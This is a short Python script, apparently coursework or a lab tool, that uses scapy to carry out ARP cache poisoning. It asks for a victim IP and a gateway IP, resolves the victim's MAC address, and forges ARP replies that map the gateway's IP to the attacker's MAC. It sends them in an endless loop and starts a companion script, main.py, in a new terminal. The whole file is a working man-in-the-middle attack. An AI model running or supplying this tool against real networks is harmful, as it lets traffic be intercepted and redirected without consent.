from scapy.all import *

"""
file = open("vIP.txt")
vIP = file.read()
file.close()
file = open("gatewayIP.txt")
gatewayIP = file.read()
file.close()
"""
vIP = raw_input("Victim IP address?")
gatewayIP = raw_input("Gateway IP address?")


def ip_to_mac(IP, retry= 10, timeout=2):
       
    #create inital ARP packet to send
    arp = ARP()
    arp.op = 1
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = IP

    response, unanswered = sr(arp, retry=retry, timeout=timeout)

    for s,r in response:
    # If there is a repsonse return the mac address related to the given IP
        return r[ARP].underlayer.src
    
    # If no reponse then return nothing
    return None

#Get the mac address of the victim, mac of the attacker, 
vMAC = ip_to_mac(vIP);
macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
#vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
#gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)
#gatewayMac = subprocess.check_output("arp -n | awk '$1 == " + gatewayIP + "  {print $3}'", shell = True)

#gatewayMAC = ip_to_mac(gatewayIP)

#Create arp packet for victim
arpVictim = Ether() / ARP()
arpVictim[Ether].src = macAttacker
arpVictim[ARP].hwsrc = macAttacker
arpVictim[ARP].psrc = gatewayIP
arpVictim[ARP].hwdst = vMAC
arpVictim[ARP].pdst = vIP

#Create arp packet for Gateway
#arpGateway = Ether() / ARP()
#arpGateway[Ether].src = macAttacker
#arpGateway[ARP].hwsrc = macAttacker
#arpGateway[ARP].psrc = vIP
#arpGateway[ARP].hwdst = gatewayMAC
#arpGateway[ARP].pdst = gatewayIP


def arpPoison():
    sendp(arpVictim, iface="enp0s3")
    #sendp(arpGateway, iface="enp0s3")
    time.sleep(1)

os.system("gnome-terminal -e 'python main.py'")

while True:
    arpPoison()
